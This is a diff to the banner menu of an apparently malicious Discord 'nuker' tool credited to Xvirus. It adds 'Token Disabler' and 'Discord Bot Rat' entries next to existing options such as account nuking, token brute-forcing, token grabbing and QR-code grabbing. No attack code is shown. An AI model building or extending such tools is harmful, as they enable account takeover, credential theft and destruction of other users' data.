@@ -584,8 +584,8 @@ def banner(theme=None):
                                     ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
 > Created by Xvirus                 ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  '''.replace('█', f'{Fore.WHITE}█{Fore.GREEN}') + f'''   
 {Fore.WHITE}───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
-{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends          |{Fore.RESET}[{Fore.GREEN}19{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon]
-{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer        |{Fore.RESET}[{Fore.GREEN}20{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon]
+{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends          |{Fore.RESET}[{Fore.GREEN}19{Fore.RESET}]{Fore.LIGHTBLACK_EX} Token Disabler (WIP)
+{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer        |{Fore.RESET}[{Fore.GREEN}20{Fore.RESET}]{Fore.LIGHTBLACK_EX} Discord Bot Rat (WIP)
 {Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} Token Brute-Force      |{Fore.RESET}[{Fore.GREEN}21{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon]
 {Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Token Grabber (WIP)    |{Fore.RESET}[{Fore.GREEN}22{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon]
 {Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber (WIP)  |{Fore.RESET}[{Fore.GREEN}23{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon]
@@ -611,8 +611,8 @@ def bannerTheme(type1, type2):
                                     ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
 > Created by Xvirus                 ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ''')+type2('''  
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-[1] Nuke Account                                |[10] Block Friends                 |[19] [Coming Soon]
-[2] Unfriend all friends                        |[11] Profile Changer               |[20] [Coming Soon]
+[1] Nuke Account                                |[10] Block Friends                 |[19] Token Disabler (WIP)
+[2] Unfriend all friends                        |[11] Profile Changer               |[20] Discord Bot Rat (WIP)
 [3] Delete and leave all servers                |[12] Token Brute-Force             |[21] [Coming Soon]
 [4] Spam Create New servers                     |[13] Token Grabber (WIP)           |[22] [Coming Soon]
 [5] Dm Deleter                                  |[14] QR Code grabber (WIP)         |[23] [Coming Soon]
